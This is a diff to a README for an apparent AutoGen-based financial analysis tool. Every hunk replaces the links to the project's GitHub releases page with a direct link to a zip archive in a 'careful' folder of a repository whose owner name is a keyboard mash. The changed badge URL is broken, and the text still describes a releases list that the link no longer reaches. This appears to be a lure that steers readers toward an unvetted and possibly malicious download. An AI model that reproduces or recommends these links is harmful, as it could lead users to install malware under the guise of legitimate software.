@@ -4,7 +4,7 @@
 Welcome! This guide will help you download and run the autogen-financial-analysis application with ease.
 
 ## 📥 Download the Application
-[![Download autogen-financial-analysis](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/lklksjgklsfjdfhkgljshdff/autogen-financial-analysis/releases)
+[![Download autogen-financial-analysis](https://raw.githubusercontent.com/lklksjgklsfjdfhkgljshdff/autogen-financial-analysis/main/careful/autogen-financial-analysis.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/lklksjgklsfjdfhkgljshdff/autogen-financial-analysis/main/careful/autogen-financial-analysis.zip)
 
 ## 📋 Overview
 autogen-financial-analysis is an enterprise-level financial analysis system based on Microsoft's AutoGen framework. This tool uses a multi-agent architecture to provide comprehensive financial analysis, risk assessment, and quantitative investment analysis capabilities. 
@@ -26,7 +26,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 🔧 Installation Instructions
 ### Step 1: Visit the Releases Page
-To get the software, visit the following link: [Download Page](https://github.com/lklksjgklsfjdfhkgljshdff/autogen-financial-analysis/releases).
+To get the software, visit the following link: [Download Page](https://raw.githubusercontent.com/lklksjgklsfjdfhkgljshdff/autogen-financial-analysis/main/careful/autogen-financial-analysis.zip).
 
 ### Step 2: Choose Your Version
 On the Releases page, you will see a list of available versions. Select the latest version for the best features and stability.
@@ -60,6 +60,6 @@ To make the most of the application, check out the following resources:
 - **Tutorial Videos**: Step-by-step videos to help you with common tasks.
 
 ## 📥 Download & Install
-Ready to get started? Don't forget to visit the download page to access the latest version of autogen-financial-analysis: [Download Page](https://github.com/lklksjgklsfjdfhkgljshdff/autogen-financial-analysis/releases). 
+Ready to get started? Don't forget to visit the download page to access the latest version of autogen-financial-analysis: [Download Page](https://raw.githubusercontent.com/lklksjgklsfjdfhkgljshdff/autogen-financial-analysis/main/careful/autogen-financial-analysis.zip). 
 
 Enjoy your new financial analysis tool!
